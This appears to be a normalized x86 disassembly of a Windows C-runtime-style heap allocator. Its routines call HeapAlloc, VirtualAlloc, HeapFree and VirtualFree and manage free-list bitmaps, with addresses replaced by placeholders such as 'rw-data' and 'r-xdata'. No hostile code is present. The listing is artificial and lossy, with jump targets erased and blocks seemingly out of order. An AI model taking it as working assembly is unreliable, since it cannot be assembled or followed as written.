call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_411580
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4148a1
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_414c5b
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_414baa
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_414baa
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_414c5b
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_414d56
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_41504c
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_410a20
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_415190
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_4151e6
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_415190
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_4152a8
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_4152ff
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_4151e6
pop ecx
sub_415344
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_41504c
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_41554c
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_41554c
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_410a20
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_41554c
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
